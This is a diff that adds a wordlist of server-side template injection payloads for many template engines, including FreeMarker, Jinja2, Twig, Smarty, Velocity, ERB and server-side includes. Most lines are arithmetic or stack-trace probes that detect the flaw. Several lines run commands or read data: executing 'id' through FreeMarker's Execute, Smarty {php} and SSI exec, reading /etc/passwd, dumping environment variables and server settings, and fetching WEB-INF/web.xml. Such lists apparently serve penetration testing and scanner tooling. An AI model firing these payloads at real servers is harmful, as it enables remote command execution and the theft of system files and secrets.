@@ -1,0 +1,46 @@
+{77*77}
+{{77*77}}
+{{{77*77}}}
+${77*77}
+${{77*77}}
+#{77*77}
+[[77*77]]
+{{=77*77}}
+[[${77*77}]]
+<%=77*77%>
+${xyz|77*77}
+#set($x=77*77)${x}
+@(77*77)
+<p th:text='${#ctx.getClass()}'></p>
+${#ctx.getClass()}
+<#assign xy="zxxxxxxz"><#assign yx="zyyyyyyz">${yx}${xy}
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
+${T(java.lang.System).getenv()}
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../../../../../WEB-INF/web.xml").getContent()}
+${''.constructor.constructor('return Error().stack')()}
+{{''.constructor.constructor('return Error().stack')()}}
+#{''.constructor.constructor('return Error().stack')()}
+<%=''.constructor.constructor('return Error().stack')()%>
+{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='Sized'%}{{c.__len__.__globals__['__builtins__']['__import__']('traceback').format_stack()}}{%endif%}{%endfor%}
+${__import__("traceback").format_stack()}
+{{__import__("traceback").format_stack()}}
+#{__import__("traceback").format_stack()}
+<%__import__("traceback").format_stack()%>
+<pre>{% debug %}</pre>
+{{[].class.base.subclasses()}}
+{{''.class.mro()[1].subclasses()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+<%=Thread.current.backtrace%>
+#{Thread.current.backtrace}
+{$smarty.version}
+{php}echo `id`;{/php}
+{{constant('Twig_Environment::VERSION')}}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+{{'/etc/passwd'|file_excerpt(1,30)}}
+{{self}}
+"-->'-->`--><!--#set var="suc" value="rtb97y3o64"--><!--#set var="uwe" value="tvdb905q86"--><!--#echo var="suc"--><!--#echo var="uwe"--><!--#exec cmd="id" -->
